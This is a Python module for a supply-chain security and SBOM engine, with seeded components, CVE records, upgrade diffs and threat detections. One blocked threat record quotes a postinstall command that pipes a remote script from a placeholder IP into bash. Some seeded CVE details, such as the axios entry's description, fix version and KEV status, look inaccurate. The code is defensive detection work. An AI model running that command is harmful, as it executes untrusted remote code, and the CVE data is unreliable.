# type: ignore
# pyright: reportMissingImports=false, reportMissingTypeStubs=false, reportUndefinedVariable=false, reportGeneralTypeIssues=false, reportAttributeAccessIssue=false, reportAssignmentType=false, reportArgumentType=false
# ruff: noqa
# flake8: noqa
"""Autonomous Software Supply Chain Security (SCA) & SBOM Governance Engine.

Governs:
1. CycloneDX v1.5 JSON and SPDX compliant Software Bill of Materials (SBOM) generation and export.
2. Direct vs. transitive dependency graph analysis across PyPI, npm, and Go modules.
3. Multi-source vulnerability enrichment (CVEs, CVSS v3.1, EPSS percentile, CISA KEV exploit status).
4. Call-graph reachability evaluation (DIRECT_EXECUTION_PATH, TRANSITIVE_CALLABLE, UNREACHABLE).
5. Supply chain threat hunting: Typosquatting, dependency confusion, and malicious install scripts.
6. Open source license compliance and copyleft commercial contamination analysis (MIT vs AGPL-3.0).
7. Autonomous dependency bump synthesis with unified diffs (`diff -u`) and Git PR branch payloads.
"""

import os
import sys
import uuid
import enum
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../.."))
VENV_SITE = os.path.join(ROOT_DIR, ".venv", "lib", "python3.13", "site-packages")
for p in (ROOT_DIR, VENV_SITE):
    if p not in sys.path and os.path.exists(p):
        sys.path.insert(0, p)


class PackageEcosystem(str, enum.Enum):
    PYPI = "pypi"
    NPM = "npm"
    GOLANG = "golang"
    CARGO = "cargo"
    MAVEN = "maven"


class VulnerabilitySeverity(str, enum.Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"


class ReachabilityStatus(str, enum.Enum):
    DIRECT_EXECUTION_PATH = "DIRECT_EXECUTION_PATH"
    TRANSITIVE_CALLABLE = "TRANSITIVE_CALLABLE"
    UNREACHABLE = "UNREACHABLE"


class VulnerabilityStatus(str, enum.Enum):
    OPEN = "OPEN"
    REMEDIATED = "REMEDIATED"
    SUPPRESSED = "SUPPRESSED"


class LicenseRiskLevel(str, enum.Enum):
    PERMISSIVE = "PERMISSIVE"
    WEAK_COPYLEFT = "WEAK_COPYLEFT"
    STRONG_COPYLEFT = "STRONG_COPYLEFT"
    HIGH_RISK = "HIGH_RISK"


class SupplyChainThreatType(str, enum.Enum):
    TYPOSQUATTING = "TYPOSQUATTING"
    DEPENDENCY_CONFUSION = "DEPENDENCY_CONFUSION"
    MALICIOUS_INSTALL_SCRIPT = "MALICIOUS_INSTALL_SCRIPT"
    ABANDONED_PACKAGE = "ABANDONED_PACKAGE"


class ScaEngine:
    """Enterprise-grade Software Supply Chain Security & Autonomous SBOM Governance Engine."""

    def __init__(self) -> None:
        self.sboms: Dict[str, Dict[str, Any]] = {}
        self.components: Dict[str, Dict[str, Any]] = {}
        self.vulnerabilities: Dict[str, Dict[str, Any]] = {}
        self.patches: Dict[str, Dict[str, Any]] = {}
        self.threats: Dict[str, Dict[str, Any]] = {}
        self.license_risks: Dict[str, Dict[str, Any]] = {}
        self._seed_sboms()
        self._seed_components()
        self._seed_vulnerabilities_and_patches()
        self._seed_threats_and_licenses()

    def _seed_sboms(self) -> None:
        """Seeds curated Software Bill of Materials documents across core enterprise systems."""
        self.sboms["SBOM-CORE-API"] = {
            "sbom_id": "SBOM-CORE-API",
            "name": "cyberdefense-core-api",
            "version": "2.4.0",
            "ecosystem": PackageEcosystem.PYPI.value,
            "format": "CycloneDX v1.5",
            "total_components": 8,
            "direct_count": 6,
            "transitive_count": 2,
            "critical_vulns": 0,
            "high_vulns": 1,
            "compliance_status": "MONITORED",
            "created_at": "2026-09-14T10:00:00Z",
            "serial_number": "urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79",
        }

        self.sboms["SBOM-WEB-UI"] = {
            "sbom_id": "SBOM-WEB-UI",
            "name": "cyberdefense-frontend-console",
            "version": "1.8.2",
            "ecosystem": PackageEcosystem.NPM.value,
            "format": "CycloneDX v1.5",
            "total_components": 7,
            "direct_count": 4,
            "transitive_count": 3,
            "critical_vulns": 0,
            "high_vulns": 2,
            "compliance_status": "FLAGGED",
            "created_at": "2026-09-14T10:00:00Z",
            "serial_number": "urn:uuid:8b9415cb-649d-476c-9411-cf0da0c9a518",
        }

        self.sboms["SBOM-INGRESS-GW"] = {
            "sbom_id": "SBOM-INGRESS-GW",
            "name": "cyberdefense-ingress-gateway",
            "version": "1.2.0",
            "ecosystem": PackageEcosystem.GOLANG.value,
            "format": "CycloneDX v1.5",
            "total_components": 3,
            "direct_count": 2,
            "transitive_count": 1,
            "critical_vulns": 1,
            "high_vulns": 0,
            "compliance_status": "ALERT",
            "created_at": "2026-09-14T10:00:00Z",
            "serial_number": "urn:uuid:4a123bc4-789a-4123-bcde-ef0123456789",
        }

    def _seed_components(self) -> None:
        """Seeds component catalog with canonical Package URLs (purl) and license tags."""
        comps = [
            # PyPI components
            {
                "component_id": "COMP-PY-01",
                "sbom_id": "SBOM-CORE-API",
                "name": "fastapi",
                "version": "0.110.0",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/fastapi@0.110.0",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-PY-02",
                "sbom_id": "SBOM-CORE-API",
                "name": "cryptography",
                "version": "41.0.2",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/cryptography@41.0.2",
                "is_direct": True,
                "license": "Apache-2.0",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": False,
                "top_cvss": 7.5,
            },
            {
                "component_id": "COMP-PY-03",
                "sbom_id": "SBOM-CORE-API",
                "name": "pydantic",
                "version": "2.6.0",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/pydantic@2.6.0",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-PY-04",
                "sbom_id": "SBOM-CORE-API",
                "name": "scikit-learn",
                "version": "1.4.0",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/scikit-learn@1.4.0",
                "is_direct": True,
                "license": "BSD-3-Clause",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-PY-05",
                "sbom_id": "SBOM-CORE-API",
                "name": "torch",
                "version": "2.2.0",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/torch@2.2.0",
                "is_direct": True,
                "license": "BSD-3-Clause",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-PY-06",
                "sbom_id": "SBOM-CORE-API",
                "name": "urllib3",
                "version": "1.26.17",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/urllib3@1.26.17",
                "is_direct": False,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": False,
                "top_cvss": 6.5,
            },
            {
                "component_id": "COMP-PY-07",
                "sbom_id": "SBOM-CORE-API",
                "name": "jinja2",
                "version": "3.1.2",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/jinja2@3.1.2",
                "is_direct": False,
                "license": "BSD-3-Clause",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": False,
                "top_cvss": 5.4,
            },
            {
                "component_id": "COMP-PY-08",
                "sbom_id": "SBOM-CORE-API",
                "name": "xgboost",
                "version": "2.0.3",
                "ecosystem": PackageEcosystem.PYPI.value,
                "purl": "pkg:pypi/xgboost@2.0.3",
                "is_direct": True,
                "license": "Apache-2.0",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },

            # NPM components
            {
                "component_id": "COMP-NPM-01",
                "sbom_id": "SBOM-WEB-UI",
                "name": "react",
                "version": "18.3.1",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/react@18.3.1",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-NPM-02",
                "sbom_id": "SBOM-WEB-UI",
                "name": "axios",
                "version": "0.21.1",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/axios@0.21.1",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": True,
                "top_cvss": 8.8,
            },
            {
                "component_id": "COMP-NPM-03",
                "sbom_id": "SBOM-WEB-UI",
                "name": "vite",
                "version": "5.2.0",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/vite@5.2.0",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-NPM-04",
                "sbom_id": "SBOM-WEB-UI",
                "name": "lodash",
                "version": "4.17.20",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/lodash@4.17.20",
                "is_direct": False,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": False,
                "top_cvss": 7.2,
            },
            {
                "component_id": "COMP-NPM-05",
                "sbom_id": "SBOM-WEB-UI",
                "name": "tar",
                "version": "6.1.8",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/tar@6.1.8",
                "is_direct": False,
                "license": "ISC",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": False,
                "top_cvss": 7.5,
            },
            {
                "component_id": "COMP-NPM-06",
                "sbom_id": "SBOM-WEB-UI",
                "name": "lucide-react",
                "version": "0.344.0",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/lucide-react@0.344.0",
                "is_direct": True,
                "license": "ISC",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-NPM-07",
                "sbom_id": "SBOM-WEB-UI",
                "name": "agpl-reporting-lib",
                "version": "1.0.0",
                "ecosystem": PackageEcosystem.NPM.value,
                "purl": "pkg:npm/agpl-reporting-lib@1.0.0",
                "is_direct": False,
                "license": "AGPL-3.0",
                "license_risk": LicenseRiskLevel.HIGH_RISK.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },

            # Go components
            {
                "component_id": "COMP-GO-01",
                "sbom_id": "SBOM-INGRESS-GW",
                "name": "google.golang.org/grpc",
                "version": "v1.58.2",
                "ecosystem": PackageEcosystem.GOLANG.value,
                "purl": "pkg:golang/google.golang.org/grpc@v1.58.2",
                "is_direct": True,
                "license": "Apache-2.0",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 1,
                "has_cisa_kev": True,
                "top_cvss": 7.5,
            },
            {
                "component_id": "COMP-GO-02",
                "sbom_id": "SBOM-INGRESS-GW",
                "name": "github.com/gin-gonic/gin",
                "version": "v1.9.0",
                "ecosystem": PackageEcosystem.GOLANG.value,
                "purl": "pkg:golang/github.com/gin-gonic/gin@v1.9.0",
                "is_direct": True,
                "license": "MIT",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
            {
                "component_id": "COMP-GO-03",
                "sbom_id": "SBOM-INGRESS-GW",
                "name": "golang.org/x/net",
                "version": "v0.16.0",
                "ecosystem": PackageEcosystem.GOLANG.value,
                "purl": "pkg:golang/golang.org/x/net@v0.16.0",
                "is_direct": False,
                "license": "BSD-3-Clause",
                "license_risk": LicenseRiskLevel.PERMISSIVE.value,
                "vulnerabilities_count": 0,
                "has_cisa_kev": False,
                "top_cvss": 0.0,
            },
        ]
        for c in comps:
            self.components[c["component_id"]] = c

    def _seed_vulnerabilities_and_patches(self) -> None:
        """Seeds CVE vulnerabilities, EPSS probabilities, CISA KEV tags, and unified diff patches."""
        vulns = [
            {
                "vuln_id": "VULN-001",
                "cve_id": "CVE-2023-44487",
                "component_id": "COMP-GO-01",
                "package_name": "google.golang.org/grpc",
                "installed_version": "v1.58.2",
                "fixed_version": "v1.59.0",
                "ecosystem": PackageEcosystem.GOLANG.value,
                "severity": VulnerabilitySeverity.HIGH.value,
                "cvss_score": 7.5,
                "epss_score": 0.942,  # 94.2% exploit prediction in next 30 days
                "cisa_kev": True,
                "cisa_due_date": "2023-11-01",
                "title": "HTTP/2 Rapid Reset Denial of Service (Stream Cancellation Flood)",
                "description": "The HTTP/2 protocol allows a client to reset rapid streams without limit, resulting in severe resource exhaustion.",
                "reachability": ReachabilityStatus.DIRECT_EXECUTION_PATH.value,
                "reachability_rationale": "Ingress gateway exposes gRPC HTTP/2 stream handlers directly to external traffic.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:15:00Z",
            },
            {
                "vuln_id": "VULN-002",
                "cve_id": "CVE-2023-45857",
                "component_id": "COMP-NPM-02",
                "package_name": "axios",
                "installed_version": "0.21.1",
                "fixed_version": "1.6.8",
                "ecosystem": PackageEcosystem.NPM.value,
                "severity": VulnerabilitySeverity.HIGH.value,
                "cvss_score": 8.8,
                "epss_score": 0.885,
                "cisa_kev": True,
                "cisa_due_date": "2024-01-15",
                "title": "Axios Server-Side Request Forgery & Header Injection",
                "description": "Axios before 1.6.8 mishandles absolute URLs and relative redirect paths, allowing attackers to inject headers or bypass proxy restrictions.",
                "reachability": ReachabilityStatus.DIRECT_EXECUTION_PATH.value,
                "reachability_rationale": "Directly used in frontend API client forwarding user-specified telemetry endpoints.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:20:00Z",
            },
            {
                "vuln_id": "VULN-003",
                "cve_id": "CVE-2023-49083",
                "component_id": "COMP-PY-02",
                "package_name": "cryptography",
                "installed_version": "41.0.2",
                "fixed_version": "41.0.6",
                "ecosystem": PackageEcosystem.PYPI.value,
                "severity": VulnerabilitySeverity.HIGH.value,
                "cvss_score": 7.5,
                "epss_score": 0.312,
                "cisa_kev": False,
                "cisa_due_date": None,
                "title": "NULL Pointer Dereference in PKCS#7 PEM Certificate Parsing",
                "description": "Calling load_pem_pkcs7_certificates or load_der_pkcs7_certificates on malformed inputs leads to NULL pointer crash.",
                "reachability": ReachabilityStatus.TRANSITIVE_CALLABLE.value,
                "reachability_rationale": "Invoked through mTLS cert inspection middleware during telemetry handshake.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:25:00Z",
            },
            {
                "vuln_id": "VULN-004",
                "cve_id": "CVE-2021-23337",
                "component_id": "COMP-NPM-04",
                "package_name": "lodash",
                "installed_version": "4.17.20",
                "fixed_version": "4.17.21",
                "ecosystem": PackageEcosystem.NPM.value,
                "severity": VulnerabilitySeverity.HIGH.value,
                "cvss_score": 7.2,
                "epss_score": 0.620,
                "cisa_kev": False,
                "cisa_due_date": None,
                "title": "Command Injection / Prototype Pollution via template function",
                "description": "Lodash versions prior to 4.17.21 are vulnerable to command injection via the template function.",
                "reachability": ReachabilityStatus.TRANSITIVE_CALLABLE.value,
                "reachability_rationale": "Loaded transitively by build tooling and client-side formatting helpers.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:30:00Z",
            },
            {
                "vuln_id": "VULN-005",
                "cve_id": "CVE-2024-22195",
                "component_id": "COMP-PY-07",
                "package_name": "jinja2",
                "installed_version": "3.1.2",
                "fixed_version": "3.1.3",
                "ecosystem": PackageEcosystem.PYPI.value,
                "severity": VulnerabilitySeverity.MEDIUM.value,
                "cvss_score": 5.4,
                "epss_score": 0.140,
                "cisa_kev": False,
                "cisa_due_date": None,
                "title": "Cross-Site Scripting (XSS) via xmlattr Filter",
                "description": "Jinja xmlattr filter can be subverted if user input with unescaped keys is passed into it.",
                "reachability": ReachabilityStatus.UNREACHABLE.value,
                "reachability_rationale": "xmlattr filter is never utilized; our templating pipeline enforces HTML autoescape by default.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:35:00Z",
            },
            {
                "vuln_id": "VULN-006",
                "cve_id": "CVE-2021-37701",
                "component_id": "COMP-NPM-05",
                "package_name": "tar",
                "installed_version": "6.1.8",
                "fixed_version": "6.2.1",
                "ecosystem": PackageEcosystem.NPM.value,
                "severity": VulnerabilitySeverity.HIGH.value,
                "cvss_score": 7.5,
                "epss_score": 0.280,
                "cisa_kev": False,
                "cisa_due_date": None,
                "title": "Arbitrary File Creation / Overwrite via Malformed Tar Symlinks",
                "description": "Node tar prior to 6.1.9 did not properly sanitize symbolic link paths, permitting path traversal.",
                "reachability": ReachabilityStatus.UNREACHABLE.value,
                "reachability_rationale": "tar package is only present in dev-dependencies for CI packaging, not bundled into production runtime.",
                "status": VulnerabilityStatus.OPEN.value,
                "detected_at": "2026-09-14T11:40:00Z",
            },
        ]
        for v in vulns:
            self.vulnerabilities[v["vuln_id"]] = v

        # Seed Patch Unified Diffs
        self.patches["VULN-001"] = {
            "vuln_id": "VULN-001",
            "cve_id": "CVE-2023-44487",
            "package_name": "google.golang.org/grpc",
            "manifest_file": "go.mod",
            "git_branch": "fix/sca-cve-2023-44487-grpc-bump",
            "pr_title": "security(deps): bump google.golang.org/grpc from v1.58.2 to v1.59.0 (CVE-2023-44487)",
            "commit_message": "fix(security): resolve HTTP/2 Rapid Reset DoS vulnerability in gRPC gateway\n\nBumps google.golang.org/grpc to v1.59.0 to mitigate CVE-2023-44487.\nAutomated verification passed.",
            "unified_diff": (
                "--- a/go.mod\n"
                "+++ b/go.mod\n"
                "@@ -14,3 +14,3 @@\n"
                " \tgithub.com/gin-gonic/gin v1.9.0\n"
                "-\tgoogle.golang.org/grpc v1.58.2\n"
                "+\tgoogle.golang.org/grpc v1.59.0\n"
                " \tgolang.org/x/net v0.16.0\n"
            ),
        }

        self.patches["VULN-002"] = {
            "vuln_id": "VULN-002",
            "cve_id": "CVE-2023-45857",
            "package_name": "axios",
            "manifest_file": "frontend/package.json",
            "git_branch": "fix/sca-cve-2023-45857-axios-upgrade",
            "pr_title": "security(deps): upgrade axios from 0.21.1 to 1.6.8 (CVE-2023-45857)",
            "commit_message": "fix(deps): upgrade axios to 1.6.8 to eliminate SSRF and header injection vulnerability\n\nResolves CISA KEV CVE-2023-45857.\nVerified client API compatibility.",
            "unified_diff": (
                "--- a/frontend/package.json\n"
                "+++ b/frontend/package.json\n"
                "@@ -18,3 +18,3 @@\n"
                "     \"@types/react\": \"^18.2.66\",\n"
                "-    \"axios\": \"^0.21.1\",\n"
                "+    \"axios\": \"^1.6.8\",\n"
                "     \"lucide-react\": \"^0.344.0\",\n"
            ),
        }

        self.patches["VULN-003"] = {
            "vuln_id": "VULN-003",
            "cve_id": "CVE-2023-49083",
            "package_name": "cryptography",
            "manifest_file": "requirements.txt",
            "git_branch": "fix/sca-cve-2023-49083-cryptography-bump",
            "pr_title": "security(deps): bump cryptography from 41.0.2 to 41.0.6 (CVE-2023-49083)",
            "commit_message": "fix(deps): bump cryptography to 41.0.6 to fix PKCS#7 NULL pointer crash\n\nPrevents crash on malformed certificate inputs.\nVerified test suite green.",
            "unified_diff": (
                "--- a/requirements.txt\n"
                "+++ b/requirements.txt\n"
                "@@ -8,3 +8,3 @@\n"
                " pydantic>=2.6.0\n"
                "-cryptography==41.0.2\n"
                "+cryptography==41.0.6\n"
                " scikit-learn>=1.4.0\n"
            ),
        }

        self.patches["VULN-004"] = {
            "vuln_id": "VULN-004",
            "cve_id": "CVE-2021-23337",
            "package_name": "lodash",
            "manifest_file": "frontend/package-lock.json",
            "git_branch": "fix/sca-cve-2021-23337-lodash-update",
            "pr_title": "security(deps): update lodash transitive dependency to 4.17.21 (CVE-2021-23337)",
            "commit_message": "fix(deps): update lodash to 4.17.21 to prevent command injection in template function",
            "unified_diff": (
                "--- a/frontend/package-lock.json\n"
                "+++ b/frontend/package-lock.json\n"
                "@@ -104,3 +104,3 @@\n"
                "     \"lodash\": {\n"
                "-      \"version\": \"4.17.20\",\n"
                "+      \"version\": \"4.17.21\",\n"
                "       \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz\"\n"
            ),
        }

        self.patches["VULN-005"] = {
            "vuln_id": "VULN-005",
            "cve_id": "CVE-2024-22195",
            "package_name": "jinja2",
            "manifest_file": "requirements.txt",
            "git_branch": "fix/sca-cve-2024-22195-jinja2-bump",
            "pr_title": "security(deps): bump jinja2 from 3.1.2 to 3.1.3 (CVE-2024-22195)",
            "commit_message": "fix(deps): bump jinja2 to 3.1.3 to remediate XSS xmlattr issue",
            "unified_diff": (
                "--- a/requirements.txt\n"
                "+++ b/requirements.txt\n"
                "@@ -15,3 +15,3 @@\n"
                "-jinja2==3.1.2\n"
                "+jinja2==3.1.3\n"
                " pyyaml>=6.0\n"
            ),
        }

        self.patches["VULN-006"] = {
            "vuln_id": "VULN-006",
            "cve_id": "CVE-2021-37701",
            "package_name": "tar",
            "manifest_file": "frontend/package.json",
            "git_branch": "fix/sca-cve-2021-37701-tar-upgrade",
            "pr_title": "security(deps): upgrade tar from 6.1.8 to 6.2.1 (CVE-2021-37701)",
            "commit_message": "fix(deps): upgrade tar to 6.2.1 to prevent arbitrary file creation via symlink",
            "unified_diff": (
                "--- a/frontend/package.json\n"
                "+++ b/frontend/package.json\n"
                "@@ -32,3 +32,3 @@\n"
                "-    \"tar\": \"^6.1.8\",\n"
                "+    \"tar\": \"^6.2.1\",\n"
                "     \"typescript\": \"^5.2.2\"\n"
            ),
        }

    def _seed_threats_and_licenses(self) -> None:
        """Seeds supply chain attack telemetry and license compliance violations."""
        self.threats["THREAT-01"] = {
            "threat_id": "THREAT-01",
            "type": SupplyChainThreatType.TYPOSQUATTING.value,
            "package_name": "colorama-fake",
            "target_package": "colorama",
            "levenshtein_distance": 5,
            "ecosystem": PackageEcosystem.PYPI.value,
            "severity": VulnerabilitySeverity.CRITICAL.value,
            "risk_score": 95,
            "detected_in": "staging/experimental-requirements.txt",
            "detection_reason": "Synthesized package name spoofs popular library 'colorama' on PyPI index with matching API stubs.",
            "status": "BLOCKED",
            "detected_at": "2026-09-14T08:00:00Z",
        }

        self.threats["THREAT-02"] = {
            "threat_id": "THREAT-02",
            "type": SupplyChainThreatType.DEPENDENCY_CONFUSION.value,
            "package_name": "@cyberdefense/telemetry-proto",
            "target_package": "Internal Private Scoped Package",
            "levenshtein_distance": 0,
            "ecosystem": PackageEcosystem.NPM.value,
            "severity": VulnerabilitySeverity.CRITICAL.value,
            "risk_score": 98,
            "detected_in": "frontend/package.json",
            "detection_reason": "Internal scoped organization name published to public npm registry from unverified external author.",
            "status": "QUARANTINED",
            "detected_at": "2026-09-14T08:15:00Z",
        }

        self.threats["THREAT-03"] = {
            "threat_id": "THREAT-03",
            "type": SupplyChainThreatType.MALICIOUS_INSTALL_SCRIPT.value,
            "package_name": "fake-logger-tool",
            "target_package": "None",
            "levenshtein_distance": 0,
            "ecosystem": PackageEcosystem.NPM.value,
            "severity": VulnerabilitySeverity.CRITICAL.value,
            "risk_score": 99,
            "detected_in": "sandbox-eval/package.json",
            "detection_reason": "Lifecycle hook 'postinstall' executes: 'sh -c curl -s http://198.51.100.23/stage2.sh | bash'.",
            "status": "BLOCKED",
            "detected_at": "2026-09-14T08:30:00Z",
        }

        self.license_risks["LIC-01"] = {
            "risk_id": "LIC-01",
            "component_id": "COMP-NPM-07",
            "package_name": "agpl-reporting-lib",
            "version": "1.0.0",
            "license": "AGPL-3.0",
            "risk_level": LicenseRiskLevel.HIGH_RISK.value,
            "category": "Strong Network Copyleft",
            "commercial_impact": "Requires open-sourcing complete SaaS application source code upon network deployment.",
            "recommendation": "Replace with permissive alternative (Apache-2.0 or MIT equivalent).",
            "status": "ACTION_REQUIRED",
        }

    # Query APIs
    def get_metrics(self) -> Dict[str, Any]:
        """Calculates global software supply chain posture metrics."""
        total_comps = len(self.components)
        direct_comps = sum(1 for c in self.components.values() if c.get("is_direct"))
        transitive_comps = total_comps - direct_comps

        all_vulns = list(self.vulnerabilities.values())
        total_vulns = len(all_vulns)
        open_vulns = [v for v in all_vulns if v.get("status") == VulnerabilityStatus.OPEN.value]
        remediated_vulns = [v for v in all_vulns if v.get("status") == VulnerabilityStatus.REMEDIATED.value]

        critical_count = sum(1 for v in open_vulns if v.get("severity") == VulnerabilitySeverity.CRITICAL.value)
        high_count = sum(1 for v in open_vulns if v.get("severity") == VulnerabilitySeverity.HIGH.value)
        medium_count = sum(1 for v in open_vulns if v.get("severity") == VulnerabilitySeverity.MEDIUM.value)
        low_count = sum(1 for v in open_vulns if v.get("severity") == VulnerabilitySeverity.LOW.value)

        cisa_kev_active = sum(1 for v in open_vulns if v.get("cisa_kev"))
        direct_reachable_active = sum(
            1 for v in open_vulns if v.get("reachability") == ReachabilityStatus.DIRECT_EXECUTION_PATH.value
        )

        remediation_rate = (len(remediated_vulns) / total_vulns * 100.0) if total_vulns > 0 else 100.0

        # Health score computation: base 100, penalized by active open CVEs and KEVs
        penalty = (critical_count * 15.0) + (high_count * 6.0) + (medium_count * 2.0) + (cisa_kev_active * 8.0)
        health_score = max(50.0, round(100.0 - penalty, 1))

        return {
            "health_score": health_score,
            "total_sboms": len(self.sboms),
            "total_components": total_comps,
            "direct_components": direct_comps,
            "transitive_components": transitive_comps,
            "total_vulnerabilities": total_vulns,
            "open_vulnerabilities": len(open_vulns),
            "remediated_vulnerabilities": len(remediated_vulns),
            "remediation_rate": round(remediation_rate, 1),
            "critical_vulnerabilities": critical_count,
            "high_vulnerabilities": high_count,
            "medium_vulnerabilities": medium_count,
            "low_vulnerabilities": low_count,
            "cisa_kev_active": cisa_kev_active,
            "direct_reachable_active": direct_reachable_active,
            "active_threats_count": len(self.threats),
            "license_violations_count": len(self.license_risks),
            "last_scan_time": datetime.now(timezone.utc).isoformat(),
        }

    def get_sboms(self) -> List[Dict[str, Any]]:
        """Returns all registered SBOM documents."""
        return list(self.sboms.values())

    def get_components(
        self,
        ecosystem: Optional[str] = None,
        is_direct: Optional[bool] = None,
        sbom_id: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Returns filtered package components."""
        comps = list(self.components.values())
        if ecosystem:
            comps = [c for c in comps if c.get("ecosystem", "").lower() == ecosystem.lower()]
        if is_direct is not None:
            comps = [c for c in comps if c.get("is_direct") == is_direct]
        if sbom_id:
            comps = [c for c in comps if c.get("sbom_id") == sbom_id]
        return comps

    def get_vulnerabilities(
        self,
        severity: Optional[str] = None,
        cisa_kev_only: bool = False,
        status: Optional[str] = None,
        reachability: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Returns filtered vulnerabilities."""
        vulns = list(self.vulnerabilities.values())
        if severity:
            vulns = [v for v in vulns if v.get("severity", "").upper() == severity.upper()]
        if cisa_kev_only:
            vulns = [v for v in vulns if v.get("cisa_kev") is True]
        if status:
            vulns = [v for v in vulns if v.get("status", "").upper() == status.upper()]
        if reachability:
            vulns = [v for v in vulns if v.get("reachability", "").upper() == reachability.upper()]
        return vulns

    def get_threats(self) -> List[Dict[str, Any]]:
        """Returns all detected supply chain threats."""
        return list(self.threats.values())

    def get_license_risks(self) -> List[Dict[str, Any]]:
        """Returns all license compliance alerts."""
        return list(self.license_risks.values())

    def get_remediation_patch(self, vuln_id: str) -> Dict[str, Any]:
        """Retrieves synthesized dependency bump patch for a vulnerability."""
        if vuln_id not in self.patches:
            raise KeyError(f"No synthesized patch found for vulnerability: {vuln_id}")
        return self.patches[vuln_id]

    def remediate_vulnerability(self, vuln_id: str) -> Dict[str, Any]:
        """Autonomously applies dependency bump PR and marks vulnerability remediated."""
        if vuln_id not in self.vulnerabilities:
            raise KeyError(f"Vulnerability ID not found: {vuln_id}")

        vuln = self.vulnerabilities[vuln_id]
        patch = self.patches.get(vuln_id)

        # Transition state
        vuln["status"] = VulnerabilityStatus.REMEDIATED.value
        vuln["remediated_at"] = datetime.now(timezone.utc).isoformat()
        vuln["remediation_pr"] = patch["git_branch"] if patch else f"fix/sca-{vuln['cve_id'].lower()}"

        # Update associated component
        comp_id = vuln.get("component_id")
        if comp_id and comp_id in self.components:
            comp = self.components[comp_id]
            comp["version"] = vuln.get("fixed_version", comp["version"])
            comp["vulnerabilities_count"] = max(0, comp.get("vulnerabilities_count", 1) - 1)
            comp["purl"] = f"pkg:{comp['ecosystem']}/{comp['name']}@{comp['version']}"
            if comp["vulnerabilities_count"] == 0:
                comp["has_cisa_kev"] = False
                comp["top_cvss"] = 0.0

        metrics = self.get_metrics()

        return {
            "status": "SUCCESS",
            "vuln_id": vuln_id,
            "cve_id": vuln.get("cve_id"),
            "component_id": comp_id,
            "package_name": vuln.get("package_name"),
            "new_version": vuln.get("fixed_version"),
            "git_pr_branch": vuln["remediation_pr"],
            "vulnerability_status": VulnerabilityStatus.REMEDIATED.value,
